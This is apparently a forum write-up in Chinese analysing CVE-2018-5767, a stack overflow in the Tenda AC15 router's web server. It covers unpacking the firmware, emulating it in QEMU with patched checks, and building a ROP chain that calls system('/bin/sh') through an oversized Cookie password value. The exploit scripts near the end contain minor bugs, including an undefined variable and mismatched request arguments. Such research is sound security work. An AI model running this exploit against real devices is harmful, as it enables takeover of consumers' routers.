

# [原创] CVE-2018-5767 分析

## 分析

CVE-2018-5767 位置在 `bin/httpd` 中。首先下载该固件，链接如下：

```url
https://drivers.softpedia.com/get/Router-Switch-Access-Point/Tenda/Tenda-AC15-Router-Firmware-1503116.shtml#download
```

下载过后使用 `binwalk` 大概判断一下该固件是否进行了加密：

```shell
binwalk -A US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin
binwalk -M US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin
```

如果上面的指令可以分析出固件的架构等一些信息，那么这个固件基本就不会是加密的，也可以使用 010editor 看一下。如果一堆乱码没有可见字符，那么大概率是加密了。使用 `binwalk` 直接解包：

```shell
binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin
```

使用 `file` 命令和 `checksec` 命令检查一下 `httpd`：

![](upload/attach/202305/979084_S8H7Y3U86G3TTCW.png)

可以看到 `httpd` 是一个 ARM 架构的 32 位小端序程序，除了 NX 保护以外，其他的所有保护都没有开启。

导致 CVE-2018-5767 的函数是 `httpd` 中的 `R7WebSceurityHandler` 函数。在 `R7WebSceurityHandler` 函数中有一段代码如下：

![](upload/attach/202305/979084_XS8BPK2M68G7UA6.png)

可以看到 `sscanf` 中的格式字符串是一个类似正则表达式的字符串：

```text
%\*[^=]=%[^;];\*
```

- `\%*` 代表过滤，也就是前面的都不要。
- `=%[^;];\*` 这部分表示 `=` 号后分号前的内容。

也就是说，这里就是取 `password` 的值。如果没有 `password`，就把 `a1 + 184` 处第一个 `=` 后面的值赋值给 `v34`。这本身没有什么问题，但是有问题的是没有对这个获取到的字符串进行长度验证。因为 `v34` 只有 128 字节，通过 IDA 静态地看 `R7WebsSecurityHandler` 的栈，`v34` 这个数组距离栈底也只有 448 字节，这很容易就溢出了，从而被控制 PC 寄存器，导致被控制执行流。但是想要执行到这一步，还需要满足程序的一些条件：

![](upload/attach/202305/979084_E2H9J358ATMKU7G.png)

可以看到有很多条件：

1. 前 8 个字节不能是 `"/public/"`、前 6 个字节不能是 `"/lang/"`、前 12 个字节不能是 `"/favicon.ico"`、前 10 个字节不能是 `"/kns-query"`、前 11 个字节不能是 `"/wdinfo.php"`、前 20 个字节不能是 `"/goform/fast_setting"`、前 11 个字节不能是 `"/goform/ate"`、前 19 个字节不能是 `"/goform/InsertWhite"`、前 15 个字节不能是 `"/yun_safe.html"`、前 27 个字节不能是 `"/goform/getWanConnectStatus"`、前 18 个字节不能是 `"/goform/getProduct"`、前 25 个字节不能是 `"/goform/getRebootStatus"`。
2. 不能包含 `"img/main-logo.png"`、`"reasy-ui-1.0.3.js"`。
3. `*(_DWORD *)(a1 + 152)` 处必须存在，不能为空。
4. `s1` 的长度不能是 1，或者第一个字符的十进制形式不能是 47，也就是 `"/"`。
5. 前 15 个字节不是 `"/goform/telnet"`，或者 `g_Pass` 存在并且不等于字符串 `"YWRtaW4="`。
6. `i <= 2`，或者前 15 个字节不是 `"/loginerr.html"`。
7. 前 11 个字节不是 `"/index.html"`，不进入 `if` 语句。

满足上面的条件即可进入内部。那么只需要去构造一个满足上面条件的 URL 就可以了，比如 `"/gorform/exec"`。

## 固件模拟

使用 QEMU 把 `httpd` 模拟起来，看看其运行起来会输出什么、监听哪些端口等。把 QEMU 的 `qemu-arm-static` 复制到 `squashfs-root` 目录下，执行以下命令：

```shell
sudo chroot . ./qemu-arm-static ./bin/httpd
```

模拟结果如下图：

![](upload/attach/202305/979084_Y3PPGQQ9Z2CEWYJ.png)

好像是卡住了。去 IDA 中看一下这里是怎么回事，输出完这个字符串后会进入一个循环，如下图：

![](upload/attach/202305/979084_TAET9H68UVZ2UES.png)

从图中可以看出，如果 `check_network(v18) <= 0` 成立的话，这里就会是一个死循环。从这个函数的名字来看，可能是检查网络的。因为模拟的时候没有给 QEMU 设置网络，所以这个函数如果网络检查不过的话，就会返回小于等于 0 的数，让程序无限循环，直到网络检测通过。

因此，要解决这个循环有两种方法：

- Patch 程序，把这个地方的检查改掉。
- 为 QEMU 设置网络。

这里的汇编代码如下图：

![](upload/attach/202305/979084_JY6W2NSHUBXC82J.png)

根据上面的汇编代码有两种改法：

- 修改 `check_network` 函数的返回值，即把 `MOV R3, R0` 改掉，把 `R0` 改为一个立即数，这个立即数大于 0 即可。
- 修改 `BGT` 指令。`BGT` 指令是大于跳转，那么把这个指令改为小于跳转（`BLE`）即可。

这里用第二种方法，选择 `Edit -> Patch program -> Change byte`：

![](upload/attach/202305/979084_2VNDGPPV6DNHVBM.png)

把前四字节转为 ARM 指令后：

![](upload/attach/202305/979084_THD56GQ96NTKWRK.png)

可以看出来是根据偏移跳转到了距离 `0x10` 处的 `0x2CFA8` 位置。那么把 `BGT` 改为 `BLE`，然后把十六进制码按照小端序的方式替换掉前四字节并确定，可以看到 `BGT` 指令已经替换为了 `BLE` 指令：

![](upload/attach/202305/979084_S9UDMZX4Z3A96JA.png)

然后选择 `Edit -> Patch program -> Apply patches to input file`，保存 Patch 到文件中，然后替换没有 Patch 的程序，再次模拟：

![](upload/attach/202305/979084_6WNT5W7KQ5TSWXK.png)

又报错了。伪代码中使用 `ConnectCfm` 函数进行了检查：

![](upload/attach/202305/979084_HZVJ6CER34YGHSQ.png)

如果检查不通过则：

![](upload/attach/202305/979084_5CRVE3TB8A698XW.png)

因此这里把它 Patch 掉就好了，跟上面一样，两种方法都可以。这次修改传入 `R3` 寄存器的值为立即数 1：

![](upload/attach/202305/979084_DH6D68PS96GX5C3.png)

然后把 Patch 保存到程序中，再次仿真模拟：

![](upload/attach/202305/979084_9P7YPY58JREAEKW.png)

已经不再报错了，但是监听的 IP 错了。Google 了一下，貌似是得设置成桥接，如下：

```shell
sudo apt install uml-utilities bridge-utils
sudo brctl addbr br0
sudo brctl addif br0 ens32
sudo ifconfig br0 up
sudo dhclient br0
chroot ./ ./qemu-arm-static ./bin/httpd
```

执行完上面的命令后就设置好桥接的网络了。但是如果直接用打过第一个 Patch 的程序，会无限循环，因为已经设置了网络，不需要那个 Patch。所以这里的程序是没有打第一个 Patch，但是打了第二个 Patch 的程序。模拟结果：

![](upload/attach/202305/979084_MSCDSAXB4ZQSKMK.png)

可以看到正常监听端口并且监听了正确的 IP。访问这个 URL：

![](upload/attach/202305/979084_EWVK8YUMMV5RH9U.png)

可以正常访问，到此 `httpd` 程序成功仿真模拟。

## 漏洞利用

在 `R7WebSceurityHandler` 的伪代码中如下：

![](upload/attach/202305/979084_R7S5239GUBNHKQT.png)

上图画线的地方是 Cookie 的位置，因此需要构造 Cookie 字段中的 `password`。然后下面检查了是否有 `gif`、`png`、`js` 等字符，否则就会进入 `if` 语句。这里不需要进去，先使用 QEMU 启动起来，使用 GDB 调试，如下命令：

```shell
sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd
gdb-multiarch -q
set endian little
set architecture arm
target remote 127.0.0.1:9999
c
```

构造代码：

```python
from pwn import *
import requests

context.arch = 'arm'
payload = str(cyclic(500), 'utf-8') + '.pngbbbb'
url = "http://192.168.153.128:81/goform/exec"

# print(payload)
headers = {'Cookie': "password=" + payload}
requests.get(url=url, headers=headers)
```

运行代码，GDB 中的 PC 寄存器的值如下：

![](upload/attach/202305/979084_F35E28NYFV6KNM7.png)

从图中可以看到 PC 寄存器的值被改为了 `0x6561616c`，即 `laae`。使用 pwntools 中的 `cyclic_find` 函数查找：

![](upload/attach/202305/979084_XTPQRP2B5FDTG63.png)

可见偏移是 444 字节。确定了偏移，那么现在就可以 ROP 了。因为 libc 每次加载时会有一个偏移，在真实环境中这个偏移地址是可以爆破的。得到 libc 的地址后，用 libc 加载的基地址加上 libc 中函数的地址，得到想要执行的函数的地址。然后用到了两个 gadget：

```assembly
ROPgadget --binary ./lib/libc.so.0 --only "mov|blx" | grep "mov r0, sp"
mov r0, sp;
blx r3;

ROPgadget --binary ./lib/libc.so.0 --only "pop" | grep "pop {r3, pc}"
pop {r3, pc};
```

那么现在需要确定 libc 加载的基地址，使用 `vmmap` 命令可以查看 libc 的基地址，好像调试也可以获取。第一个 gadget 是将 `sp` 放入到 `r0` 中，即传入一个参数，然后使用 `blx` 调用 `r3` 中的函数；第二个 gadget 为将 PC 寄存器的地址弹入 `r3` 寄存器当中。代码如下：

```python
import requests
from pwn import *

context.arch = 'arm'
context.log_level = 'debug'

libc_base = 0x409af000
libc = ELF('./lib/libc.so.0')
system_addr = base + libc.sym['system']
str1 = b"/bin/sh\x00"

mov_r0_addr = libc_base + 0x00040cb8  # mov r0, sp; blx r3;
pop_r3_addr = libc_base + 0x00018298  # pop {r3, pc};

url = "http://192.168.153.128:81/goform/exec"
payload = (
    b'a' * 444
    + b".gif"
    + p32(pop_r3_addr)
    + p32(system_addr)
    + p32(mov_r0_addr)
    + str1
)

headers = {"Cookie": b"password=" + payload}
requests.get(url=url, cookies=cookie)
```
